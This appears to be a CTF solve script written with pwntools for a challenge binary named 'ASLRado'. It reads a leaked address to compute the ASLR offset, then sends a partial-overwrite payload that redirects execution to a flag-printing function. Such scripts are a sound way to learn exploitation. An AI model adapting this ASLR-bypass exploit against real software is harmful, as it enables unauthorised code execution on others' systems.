from pwn import *
from sys import stdout

def main():

    # remoteProcess   = remote("ctf.compsecu.com", 10101)
    remoteProcess   = process("./ASLRado")
    validateLoginRE = 0x404eb7
    callGetFlagRE   = 0x404f86

    # Get base address
    validateLoginRT = remoteProcess.recvline()
    stdout.write(f'{validateLoginRT}\n')
    validateLoginRT = str(validateLoginRT).split(" ")[5][2:-3]
    validateLoginRT = int(validateLoginRT, 16)
    stdout.write(f'BASE ADDRESS:_> {hex(validateLoginRT)}\n')

    # Prepare target address
    ASLRDiff = abs(validateLoginRT - validateLoginRE)
    stdout.write(f'ASLRDiff = {ASLRDiff}\n')

    # Receive and throw away the next 5 lines
    for _ in range(5):
        stdout.write(f'{remoteProcess.recvline()}\n')

    # Prepare first input
    sendLine = b"adonay_"

    # Send first input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    stdout.write(f'{remoteProcess.recvline()}\n')

    # Calculate target address
    stdout.write(f'ASLR Offset:_> {ASLRDiff}\n')
    targetAddress = callGetFlagRE - ASLRDiff

    stdout.write(f'targetAddress:_> {hex(targetAddress)}\n')

    # Prepare second input
    sendLine = b"1"

    # Send second input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    # Prepare third input
    sendLine = b"A" + b"\x86\x4f\x40"
    sendLine = b"A" + p32(targetAddress)[0:3]

    # Send third input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    # Receive remainder of lines until EOF
    response = remoteProcess.recvall()
    stdout.write(f'{response}\n')

if __name__ == "__main__":
    main()
